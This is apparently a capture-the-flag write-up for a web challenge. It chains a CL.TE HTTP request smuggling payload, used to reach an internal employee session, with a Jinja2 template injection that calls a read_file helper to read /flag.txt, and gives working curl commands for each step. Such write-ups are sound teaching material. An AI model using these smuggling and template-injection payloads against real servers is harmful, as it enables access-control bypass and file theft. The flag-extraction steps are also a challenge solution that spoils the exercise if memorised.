

<img width="1127" height="415" alt="image" src="https://github.com/user-attachments/assets/5998a7b6-f187-4fcb-9fff-80554b47c25d" />

<img width="757" height="83" alt="image" src="https://github.com/user-attachments/assets/068ed4ba-0543-496a-b075-2ebbb71276f2" />



## Initial Reconnaissance

Navigating to the `/employee` endpoint returns a `403 Forbidden`, but with useful details about the backend infrastructure:

```text
Direct Employee Access Denied
accepted job endpoint: POST /employee
accepted body formats: raw_request form field or text/plain raw HTTP
edge parser: honors Transfer-Encoding: chunked
bridge parser: trusts Content-Length before forwarding remaining bytes
internal request: GET /employee/session HTTP/1.1
required internal header: X-Employee-Gate: internal
```

**Key observations:**

- Two HTTP parsers exist: an edge parser and a bridge parser
- The edge parser honors Transfer-Encoding: chunked
- The bridge parser trusts Content-Length and forwards the remaining bytes
- We need to trigger an internal `GET /employee/session` request with the header `X-Employee-Gate: internal`
- This is a textbook CL.TE (Content-Length vs Transfer-Encoding) Request Smuggling case

---

##  Exploitation

### HTTP Request Smuggling Payload

The working payload uses the `raw_request` form field inside a multipart POST:

```bash
curl -X POST https://ganzir-80476e3bed10.inst.omnictf.com/employee \
  -F "raw_request=POST /employee HTTP/1.1
Host: ganzir-80476e3bed10.inst.omnictf.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /employee/session HTTP/1.1
X-Employee-Gate: internal

" -c cookies.txt -L
```


### Capturing Authentication

The response includes critical cookies:

```text
Set-Cookie: site19_employee_gate=eyJ1c2VyIjoiY2Fzc2llIiwic2NvcGUiOiJlbXBsb3llZS1pbmdyZXNzIn0...
Set-Cookie: site19_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Set-Cookie: site19_session=.eJw1issJgDAQBVtZ3jlYQDqwBhFZ9PmBmEg2HkTs3YB4GpiZG8Mc1FYafHdDSgV2mulCOLSxMEcNwv0I6SLFattSlHQwcpI5ZRm1Kjbon97hH4dFC-FLPulwGjM8vhHPC3i9KWc...
```

Decoded:

- `site19_employee_gate` → `{"user":"cassie","scope":"employee-ingress"}`
- `site19_jwt` → `{"sub":"cassie","alg_note":"JWT is signed correctly; look elsewhere."}`

By following the redirect (`-L`), we automatically authenticate as **Cassie Mercer (Level 1 — Junior Records Technician)**, confirmed by:

```text
Internal employee session opened for cassie.
```

---

## Internal Exploration

With authenticated Level 1 access, several endpoints become available:

| Endpoint | Description |
|---|---|
| `/records` | Archive records with case lookup |
| `/jwt` | Token audit (properly signed, no exploitation vector) |
| `/profile` | User profile with editable bio |
| `/directory` | Employee directory (Level 1–5) |
| `/anomalies` | SCP anomaly registry |
| `/comms` | Communication intercepts |
| `/planner` | Route planner with simulation |
| `/briefing-template` |  **Target endpoint** |

The search functionality in `/records` reveals a few interesting log lines:

```text
No readable result for /admin/export
JWT kid rotation completed. Manual token editing invalidates signature
Briefing template dry-run available to Records staff at /briefing-template
Records user cassie assigned to harness inventory cleanup
```

This points toward `/briefing-template` as the next step

---

## SSTI Discovery

The `/briefing-template` page exposes a Jinja2 template engine, along with very telling information:

```html
<form method="post" action="/briefing-template">
  <label>Template source <textarea name="template" rows="8">Ganzir strike wave: {{ wave }}
Vector: {{ vector }}</textarea></label>
  <button>Render Template</button>
</form>

<h2>Operator Notes</h2>
<pre>engine: Jinja2
variables: wave, vector
helper: read_file(path)
flag copy: /flag.txt</pre>
```

This is a classic **Server-Side Template Injection** case, made worse by a dangerous helper function exposed directly in the template context

---

## Extraction

### Main payload

```bash
curl -X POST https://ganzir-80476e3bed10.inst.omnictf.com/briefing-template \
  -b cookies.txt \
  -d "template={{ read_file('/flag.txt') }}"
```

### Alternative payloads

```bash
# With URL encoding
curl -X POST https://ganzir-80476e3bed10.inst.omnictf.com/briefing-template \
  -b cookies.txt \
  --data-urlencode "template={{ read_file('/flag.txt') }}"

# Combined with existing variables
curl -X POST https://ganzir-80476e3bed10.inst.omnictf.com/briefing-template \
  -b cookies.txt \
  -d "template=Flag: {{ read_file('/flag.txt') }}"
```

The `{{ read_file('/flag.txt') }}` payload executes the helper function to read the flag file, and the rendered output contains the flag.

---
